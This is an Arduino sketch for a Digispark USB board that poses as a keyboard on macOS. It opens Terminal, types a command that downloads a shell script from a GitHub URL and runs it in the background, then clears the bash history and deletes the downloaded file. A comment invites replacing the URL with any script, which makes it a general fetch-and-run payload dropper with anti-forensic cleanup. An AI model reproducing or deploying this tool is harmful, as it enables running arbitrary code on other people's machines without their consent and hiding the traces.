#include "DigiKeyboard.h"

void setup() {
  // empty
}

void loop() {
  // Initialise digispark
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(600);

  // Hits cmd+space to open spotlight
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Opens terminal
  DigiKeyboard.print("Terminal.app");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // https://superuser.com/a/448465
  DigiKeyboard.print(" \"$( ");
  // Downloads the script
  DigiKeyboard.print("curl \"");
  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/bash/speak.sh");  // CHANGE THE URL HERE TO YOUR SCRIPT
  DigiKeyboard.print("\" > $TMPDIR/16691615; " );
  // Runs it
  DigiKeyboard.print("bash $TMPDIR/16691615; ");
  // Cleans up after itself
  DigiKeyboard.print("history -c; ");
  DigiKeyboard.print("rm ~/.bash_history;" );
  DigiKeyboard.print("rm $TMPDIR/16691615");
  // Hits enter
  DigiKeyboard.print(" )\" & disown;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Quits terminal
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);



  for (;;) {/* Stops the loop */}
}
